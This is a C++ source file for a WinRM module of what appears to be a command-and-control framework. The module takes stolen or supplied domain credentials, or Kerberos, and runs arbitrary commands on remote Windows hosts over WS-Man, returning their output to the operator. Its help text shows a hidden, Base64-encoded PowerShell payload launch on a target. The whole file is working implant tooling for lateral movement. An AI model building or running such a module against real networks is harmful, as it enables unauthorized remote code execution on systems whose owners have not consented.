#include "WinRM.hpp"

#include "Common.hpp"

#include <sstream>

#ifdef _WIN32
#include <windows.h>
#define WSMAN_API_VERSION_1_1 1
#include <wsman.h>
#endif

using namespace std;

constexpr std::string_view moduleNameWinRM = "winRm";
constexpr unsigned long long moduleHashWinRM = djb2(moduleNameWinRM);

#ifdef _WIN32
extern "C" __declspec(dllexport) WinRM* WinRMConstructor()
{
    return new WinRM();
}
#else
extern "C" __attribute__((visibility("default"))) WinRM* WinRMConstructor()
{
    return new WinRM();
}
#endif

WinRM::WinRM()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameWinRM), moduleHashWinRM)
#else
    : ModuleCmd("", moduleHashWinRM)
#endif
{
}

WinRM::~WinRM() = default;

std::string WinRM::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    info += "WinRM Module:\n";
    info += "Execute a command remotely over WS-Man using the native WinRM client API.\n";
    info += "Administrator privileges on the remote machine are required.\n";
    info += "Supports no credential, credential-based and Kerberos authentication (endpointWide must be FQDN).\n";
    info += "\nUsage examples:\n";
    info += " - winRm -u DOMAIN\\Username Password https://target:5986/wsman powershell.exe -nop -w hidden -e <Base64Payload> \n";
    info += " - winRm -k http://target.example.com:5985/wsman whoami.exe /all \n";
    info += " - winRm -n http://target:5985/wsman dir c:\\ \n";
    info += "\nOptions:\n";
    info += " -u <user> <password> <target>  Use username and password authentication\n";
    info += " -k <targetFQDN>                Use Kerberos authentication\n";
    info += " -n <target>                    No cred provided\n";
    info += "\nNote:\n";
    info += " The command and arguments following the target are passed to the remote process.\n";
#endif
    return oss.str();
}


int WinRM::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    if (splitedCmd.size() >= 2)
    {
        string mode = splitedCmd[1];

        if(mode=="-u" && splitedCmd.size() >= 5)
        {
            string usernameDomain=splitedCmd[2];
            string password=splitedCmd[3];
            string target=splitedCmd[4];
            std::string username="";
            std::string domain=".";

            std::vector<std::string> splitedList;
            splitList(usernameDomain, "\\", splitedList);

            if(splitedList.size()==1)
                username = splitedList[0];
            else if(splitedList.size()>1)
            {
                domain = splitedList[0];
                username = splitedList[1];
            }

            std::string cmd = domain;
            cmd += '\0';
            cmd += username;
            cmd += '\0';
            cmd += password;
            cmd += '\0';
            cmd += target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 5; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else if((mode=="-n" || mode=="-k") && splitedCmd.size() >= 3)
        {
            string target=splitedCmd[2];

            std::string cmd = "";
            cmd += target;

            c2Message.set_cmd(cmd);

            std::string programToLaunch="";
            for (int idx = 3; idx < splitedCmd.size(); idx++) 
            {
                if(!programToLaunch.empty())
                    programToLaunch+=" ";
                programToLaunch+=splitedCmd[idx];
            }

            c2Message.set_data(programToLaunch.data(), programToLaunch.size());
        }
        else
        {
            c2Message.set_returnvalue(getInfo());
            return -1;
        }

        c2Message.set_instruction(splitedCmd[0]);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }


#endif
    return 0;
}

int WinRM::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string cmd = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction()); 
    c2RetMessage.set_cmd(cmd); 

    int error=0;
    std::string result;

#ifdef _WIN32
    error = runCommand(c2Message, result);
#else
    result = "Only supported on Windows.\n";
#endif

    if(error)
        c2RetMessage.set_errorCode(error);

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);
    return 0;
}


#define ERROR_CONFIG 1 
#define ERROR_WSMAN_INIT 2
#define ERROR_WSMAN_CREATE_SESSION 3
#define ERROR_WSMAN_CREATE_EVENT 4
#define ERROR_WSMAN_CREATE_SHELL 5
#define ERROR_WSMAN_RUN_SHELL_COMMAND 6


int WinRM::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#ifdef BUILD_TEAMSERVER
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        if(errorCode==ERROR_CONFIG)
            errorMsg = "Failed with input data.";
        else if(errorCode==ERROR_WSMAN_CREATE_EVENT)
            errorMsg = "Failed to create synchronization event for WinRM output.";
        else
            errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}


#ifdef _WIN32

namespace
{

    std::wstring widen(const std::string& value)
    {
        if (value.empty())
        {
            return std::wstring();
        }

        int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
        if (required <= 0)
        {
            return std::wstring();
        }

        std::wstring buffer(static_cast<size_t>(required), L'\0');
        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required);
        return buffer;
    }


    std::string narrow(const std::wstring& value)
    {
        if (value.empty())
        {
            return std::string();
        }

        int required = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
        if (required <= 0)
        {
            return std::string();
        }

        std::string buffer(static_cast<size_t>(required), '\0');
        WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required, nullptr, nullptr);
        return buffer;
    }


    std::string formatWin32Error(DWORD errorCode, PCWSTR detail)
    {
        std::ostringstream oss;
        oss << "Err 0x" << std::hex << std::uppercase << errorCode;
        oss << std::nouppercase << std::dec;

        if (detail != nullptr)
        {
            oss << ": " << narrow(std::wstring(detail));
        }
        else
        {
            LPWSTR messageBuffer = nullptr;
            DWORD length = FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                          nullptr,
                                          errorCode,
                                          0,
                                          reinterpret_cast<LPWSTR>(&messageBuffer),
                                          0,
                                          nullptr);
            if (length != 0 && messageBuffer != nullptr)
            {
                oss << ": " << narrow(std::wstring(messageBuffer, messageBuffer + length));
                LocalFree(messageBuffer);
            }
        }

        oss << '\n';
        return oss.str();
    }


    struct ShellContext
    {
        HANDLE eventHandle = nullptr;
        DWORD errorCode = ERROR_SUCCESS;
        std::string message;
    };


    struct CommandContext
    {
        HANDLE eventHandle = nullptr;
        DWORD errorCode = ERROR_SUCCESS;
        std::string message;
        WSMAN_COMMAND_HANDLE commandHandle = nullptr;
    };


    struct ReceiveContext
    {
        HANDLE eventHandle = nullptr;
        DWORD errorCode = ERROR_SUCCESS;
        std::string message;
        std::string output;
        DWORD exitCode = 0;
        bool completed = false;
    };

    
    void CALLBACK ShellCallback(PVOID context,
                                 DWORD flags,
                                 WSMAN_ERROR* error,
                                 WSMAN_SHELL_HANDLE shell,
                                 WSMAN_COMMAND_HANDLE /*command*/,
                                 WSMAN_OPERATION_HANDLE operationHandle,
                                 WSMAN_RESPONSE_DATA* /*data*/)
    {
        (void)flags;
        (void)shell;

        auto* shellContext = static_cast<ShellContext*>(context);
        if (error != nullptr && error->code != ERROR_SUCCESS)
        {
            shellContext->errorCode = error->code;
            if (error->errorDetail != nullptr)
            {
                shellContext->message = narrow(std::wstring(error->errorDetail));
            }
        }

        if (operationHandle != nullptr)
        {
            WSManCloseOperation(operationHandle, 0);
        }

        if (shellContext->eventHandle != nullptr)
        {
            SetEvent(shellContext->eventHandle);
        }
    }


    void CALLBACK CommandCallback(PVOID context,
                                   DWORD flags,
                                   WSMAN_ERROR* error,
                                   WSMAN_SHELL_HANDLE /*shell*/,
                                   WSMAN_COMMAND_HANDLE command,
                                   WSMAN_OPERATION_HANDLE operationHandle,
                                   WSMAN_RESPONSE_DATA* /*data*/)
    {
        (void)flags;

        auto* commandContext = static_cast<CommandContext*>(context);
        if (error != nullptr && error->code != ERROR_SUCCESS)
        {
            commandContext->errorCode = error->code;
            if (error->errorDetail != nullptr)
            {
                commandContext->message = narrow(std::wstring(error->errorDetail));
            }
        }
        else
        {
            commandContext->commandHandle = command;
        }

        if (operationHandle != nullptr)
        {
            WSManCloseOperation(operationHandle, 0);
        }

        if (commandContext->eventHandle != nullptr)
        {
            SetEvent(commandContext->eventHandle);
        }
    }


    void CALLBACK ReceiveCallback(PVOID context,
                                   DWORD flags,
                                   WSMAN_ERROR* error,
                                   WSMAN_SHELL_HANDLE /*shell*/,
                                   WSMAN_COMMAND_HANDLE /*command*/,
                                   WSMAN_OPERATION_HANDLE /*operationHandle*/,
                                   WSMAN_RESPONSE_DATA* data)
    {
        auto* receiveContext = static_cast<ReceiveContext*>(context);

        if (error != nullptr && error->code != ERROR_SUCCESS)
        {
            receiveContext->errorCode = error->code;
            if (error->errorDetail != nullptr)
            {
                receiveContext->message = narrow(std::wstring(error->errorDetail));
            }
            receiveContext->completed = true;
        }

        if (data != nullptr)
        {
            const WSMAN_RECEIVE_DATA_RESULT& receiveData = data->receiveData;

            if (receiveData.streamData.type == WSMAN_DATA_TYPE_TEXT &&
                receiveData.streamData.text.buffer != nullptr &&
                receiveData.streamData.text.bufferLength > 0)
            {
                std::wstring segment(receiveData.streamData.text.buffer, receiveData.streamData.text.buffer + receiveData.streamData.text.bufferLength);
                receiveContext->output.append(narrow(segment));
            }
            else if (receiveData.streamData.type== WSMAN_DATA_TYPE_BINARY && receiveData.streamData.binaryData.data && receiveData.streamData.binaryData.dataLength > 0)
            {
                const char* buf = reinterpret_cast<const char*>(receiveData.streamData.binaryData.data);
                size_t len = receiveData.streamData.binaryData.dataLength;

                receiveContext->output.append(buf, buf + len);
            }

            if (receiveData.commandState != nullptr && _wcsicmp(receiveData.commandState, WSMAN_COMMAND_STATE_DONE) == 0)
            {
                receiveContext->completed = true;
                receiveContext->exitCode = receiveData.exitCode;
            }
        }

        if ((flags & WSMAN_FLAG_CALLBACK_END_OF_OPERATION) != 0)
        {
            receiveContext->completed = true;
        }

        if (receiveContext->eventHandle != nullptr)
        {
            SetEvent(receiveContext->eventHandle);
        }
    }

}


int WinRM::runCommand(const C2Message& c2Message, std::string& result) const
{
    std::string cmd = c2Message.cmd();

    std::vector<std::string> splitedList;
    std::string delimitator;
    delimitator+='\0';
    splitList(cmd, delimitator, splitedList);
    
    bool useToken=false;
    std::string authority="";

    bool usePassword=false;
    std::string target="";
    std::string domainName="";
    std::string username="";
    std::string user="";
    std::string password="";

    if(splitedList.size()==4)
    {
        usePassword=true;

        domainName=splitedList[0];
        username=splitedList[1];
        password=splitedList[2];
        target=splitedList[3];

        user=domainName;
        user+="\\";
        user+=username;

    }
    else if(splitedList.size()==1)
    {
        usePassword=false;

        target=splitedList[0];
    }
    else
    {
        result = "";
        return ERROR_CONFIG;
    }

    const std::string data = c2Message.data();

    std::wstring endpointWide = widen(target);
    std::wstring commandLineWide = widen(data);

    WSMAN_API_HANDLE apiHandle = nullptr;
    DWORD status = WSManInitialize(0, &apiHandle);

    if (status != ERROR_SUCCESS)
    {
        result = formatWin32Error(status, nullptr);
        return ERROR_WSMAN_INIT;
    }

    WSMAN_AUTHENTICATION_CREDENTIALS credentials{};
    WSMAN_AUTHENTICATION_CREDENTIALS* credentialsPtr = nullptr;
    std::wstring usernameWide;
    std::wstring passwordWide;
    if (usePassword)
    {
        usernameWide = widen(username);
        passwordWide = widen(password);
        credentials.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
        credentials.userAccount.username = usernameWide.c_str();
        credentials.userAccount.password = passwordWide.c_str();
        credentialsPtr = &credentials;
    }

    WSMAN_SESSION_HANDLE session = nullptr;
    status = WSManCreateSession(apiHandle,
                                endpointWide.empty() ? nullptr : endpointWide.c_str(),
                                0,
                                credentialsPtr,
                                nullptr,
                                &session);
    if (status != ERROR_SUCCESS)
    {
        WSManDeinitialize(apiHandle, 0);
        result = formatWin32Error(status, nullptr);
        return ERROR_WSMAN_CREATE_SESSION;
    }

    ShellContext shellContext;
    shellContext.eventHandle = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (shellContext.eventHandle == nullptr)
    {
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);

        result = "";
        return ERROR_WSMAN_CREATE_EVENT;
    }

    WSMAN_SHELL_ASYNC shellAsync{};
    shellAsync.operationContext = &shellContext;
    shellAsync.completionFunction = ShellCallback;

    WSMAN_SHELL_HANDLE shellHandle = nullptr;
    WSManCreateShell(session,
                     0,
                     WSMAN_CMDSHELL_URI,
                     nullptr,
                     nullptr,
                     nullptr,
                     &shellAsync,
                     &shellHandle);

    WaitForSingleObject(shellContext.eventHandle, INFINITE);

    if (shellContext.errorCode != ERROR_SUCCESS)
    {
        std::string message = shellContext.message.empty() ? formatWin32Error(shellContext.errorCode, nullptr)
                                                            : shellContext.message + "\n";
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);

        result =  message;
        return ERROR_WSMAN_CREATE_SHELL;
    }

    CommandContext commandContext;
    commandContext.eventHandle = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (commandContext.eventHandle == nullptr)
    {
        WSManCloseShell(shellHandle, 0, NULL);
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);

        result = "";
        return ERROR_WSMAN_CREATE_EVENT;
    }

    WSMAN_SHELL_ASYNC commandAsync{};
    commandAsync.operationContext = &commandContext;
    commandAsync.completionFunction = CommandCallback;

    WSManRunShellCommand(shellHandle,
                         0,
                         commandLineWide.c_str(),
                         nullptr,
                         nullptr,
                         &commandAsync,
                         &commandContext.commandHandle);

    WaitForSingleObject(commandContext.eventHandle, INFINITE);

    if (commandContext.errorCode != ERROR_SUCCESS)
    {
        std::string message = commandContext.message.empty() ? formatWin32Error(commandContext.errorCode, nullptr)
                                                             : commandContext.message + "\n";
        if (commandContext.commandHandle != nullptr)
        {
            WSManCloseCommand(commandContext.commandHandle, 0, NULL);
        }
        CloseHandle(commandContext.eventHandle);
        WSManCloseShell(shellHandle, 0, NULL);
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);

        result =  message;
        return ERROR_WSMAN_RUN_SHELL_COMMAND;
    }

    ReceiveContext receiveContext;
    receiveContext.eventHandle = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (receiveContext.eventHandle == nullptr)
    {
        WSManCloseCommand(commandContext.commandHandle, 0, NULL);
        CloseHandle(commandContext.eventHandle);
        WSManCloseShell(shellHandle, 0, NULL);
        CloseHandle(shellContext.eventHandle);
        WSManCloseSession(session, 0);
        WSManDeinitialize(apiHandle, 0);

        result = "";
        return ERROR_WSMAN_CREATE_EVENT;
    }

    WSMAN_SHELL_ASYNC receiveAsync{};
    receiveAsync.operationContext = &receiveContext;
    receiveAsync.completionFunction = ReceiveCallback;

    WSMAN_STREAM_ID_SET streamSet{};
    PCWSTR streams[2] = { WSMAN_STREAM_ID_STDOUT, WSMAN_STREAM_ID_STDERR };
    streamSet.streamIDs = const_cast<PCWSTR*>(streams);
    streamSet.streamIDsCount = 2;

    while (!receiveContext.completed)
    {
        ResetEvent(receiveContext.eventHandle);
        WSMAN_OPERATION_HANDLE receiveOp = nullptr;
        WSManReceiveShellOutput(shellHandle,
                                commandContext.commandHandle,
                                0,
                                &streamSet,
                                &receiveAsync,
                                &receiveOp);


        WaitForSingleObject(receiveContext.eventHandle, INFINITE);

        if(receiveOp != nullptr)
            WSManCloseOperation(receiveOp, 0);

        if (receiveContext.errorCode != ERROR_SUCCESS)
        {
            break;
        }
    }

    std::string response;
    if (receiveContext.errorCode != ERROR_SUCCESS)
    {
        response = receiveContext.message.empty() ? formatWin32Error(receiveContext.errorCode, nullptr)
                                                  : receiveContext.message + "\n";
    }
    else
    {
        response = receiveContext.output;
        if (response.empty())
        {
            response = "No output.\n";
        }

        std::ostringstream trailer;
        trailer << "\n[Code] " << receiveContext.exitCode << "\n";
        response.append(trailer.str());
    }


    if (receiveContext.eventHandle != nullptr)
        CloseHandle(receiveContext.eventHandle);

    if (commandContext.commandHandle != nullptr)
        WSManCloseCommand(commandContext.commandHandle, 0, NULL);
    
    CloseHandle(commandContext.eventHandle);
    WSManCloseShell(shellHandle, 0, NULL);
    CloseHandle(shellContext.eventHandle);
    WSManCloseSession(session, 0);
    WSManDeinitialize(apiHandle, 0);

    result =  response;
    return 0;
}
#endif
